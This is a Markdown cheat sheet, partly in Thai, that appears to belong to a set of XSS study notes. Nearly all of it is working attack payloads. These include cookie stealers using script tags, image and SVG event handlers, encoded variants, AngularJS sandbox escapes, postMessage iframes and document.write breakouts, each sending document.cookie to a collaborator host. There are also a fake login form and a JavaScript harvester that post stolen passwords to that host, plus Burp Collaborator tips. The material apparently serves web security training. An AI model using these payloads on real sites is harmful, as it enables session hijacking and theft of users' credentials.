# Cookie Stealer Payloads
> [Back to Index](README.md)

---

## ก่อนใช้ Payload: เช็ค Cookie Flags

```
Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

HttpOnly = true?  → ใช้ Credential Harvesting
HttpOnly = false? → ใช้ Cookie Stealer ได้!
```

**วิธีเช็ค:**
1. DevTools → Application → Cookies
2. หรือดู Response header: `Set-Cookie: ...`

---

## Cookie Stealer Payloads

### Basic Payloads

```javascript
// document.location (redirect)
<script>document.location='https://COLLABORATOR/?c='+document.cookie</script>

// fetch (background, no redirect)
<script>fetch('https://COLLABORATOR/?c='+document.cookie)</script>

// Image tag
<img src=x onerror="fetch('https://COLLABORATOR/?c='+document.cookie)">

// SVG
<svg onload="fetch('https://COLLABORATOR/?c='+document.cookie)">
```

### Encoded Payloads

```javascript
// URL encoded +
fetch('https://COLLABORATOR/?c='%2bdocument.cookie)

// Base64 encoded cookie
fetch('https://COLLABORATOR/?c='+btoa(document.cookie))

// encodeURIComponent
fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))
```

### AngularJS Payloads

```javascript
// Basic
{{$on.constructor('alert(1)')()}}

// Cookie Stealer
{{$on.constructor('document.location="https://COLLABORATOR?c="+document.cookie')()}}

// fetch version
{{$on.constructor('fetch("https://COLLABORATOR?c="+document.cookie)')()}}
```

### postMessage Payloads

```html
<!-- JSON.parse pattern -->
<iframe src="https://TARGET.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch(`https://COLLABORATOR/?c=`+encodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>

<!-- JavaScript URL pattern (with http bypass) -->
<iframe src="https://TARGET.net/"
        onload="this.contentWindow.postMessage(
          'javascript:document.location=`https://COLLABORATOR?c=`+document.cookie',
          '*')">
</iframe>

<!-- innerHTML pattern -->
<iframe src="https://TARGET.net/"
        onload="this.contentWindow.postMessage(
          '<img src=1 onerror=fetch(`https://COLLABORATOR?c=`+btoa(document.cookie))>',
          '*')">
</iframe>
```

### document.write Payloads

```html
<!-- Basic -->
"></select><script>document.location='https://COLLABORATOR/?c='+document.cookie</script>

<!-- URL encoded -->
%22%3E%3C/select%3E%3Cscript%3Edocument.location='https://COLLABORATOR/?c='%2bdocument.cookie%3C/script%3E
```

---

## Credential Harvesting (HttpOnly = true)

เมื่อ cookie มี HttpOnly → ต้องหลอกเอา credentials แทน

### Fake Login Form

```html
<h1>Session expired. Please login again.</h1>
<form action="https://COLLABORATOR/steal" method="POST">
  <input name="username" placeholder="Username"><br>
  <input name="password" type="password" placeholder="Password"><br>
  <button>Login</button>
</form>
```

### JavaScript Credential Harvester

```html
<input name=username id=username>
<input type=password name=password onchange="
  fetch('https://COLLABORATOR',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
  })
">
```

---

## Payload Selection Guide

| Scenario | Payload |
|----------|---------|
| Basic XSS test | `<script>alert(1)</script>` |
| innerHTML sink | `<img src=x onerror=alert(1)>` |
| URL/href sink | `javascript:alert(1)` |
| eval() sink | `alert(1)` |
| AngularJS | `{{$on.constructor('alert(1)')()}}` |
| Cookie steal | `fetch('https://COLLAB/?c='+document.cookie)` |
| HttpOnly cookie | Credential harvesting form |

---

## Burp Collaborator Tips

1. **Copy Collaborator URL:**
   - Burp → Collaborator → Copy to clipboard

2. **Poll for interactions:**
   - Collaborator → Poll now

3. **Check DNS + HTTP:**
   - ดูทั้ง DNS และ HTTP interactions

4. **Extract cookie:**
   - HTTP tab → Request → ดู query parameter

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────┐
│                 PAYLOAD QUICK REFERENCE                  │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  Cookie Stealer (short):                                │
│  fetch('https://COLLAB/?c='+document.cookie)           │
│                                                         │
│  Cookie Stealer (redirect):                             │
│  document.location='https://COLLAB/?c='+document.cookie │
│                                                         │
│  Event handler (innerHTML):                             │
│  <img src=x onerror=fetch('https://COLLAB/?c='+...     │
│                                                         │
│  AngularJS:                                             │
│  {{$on.constructor('...')()}}                          │
│                                                         │
└─────────────────────────────────────────────────────────┘
```

---

> **Next:** [04-Bypass-Techniques.md](04-Bypass-Techniques.md)
